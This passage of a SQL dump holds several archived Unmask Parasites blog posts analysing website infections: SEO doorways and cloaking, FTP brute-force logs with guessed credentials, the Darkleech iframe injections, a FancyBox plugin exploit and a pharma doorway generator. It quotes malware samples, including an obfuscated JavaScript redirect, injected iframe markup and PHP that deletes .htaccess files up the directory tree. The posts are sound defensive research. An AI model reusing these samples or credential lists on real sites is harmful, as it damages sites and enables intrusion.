container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis .To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (40, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (41, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (42, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (43, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (44, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (45, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 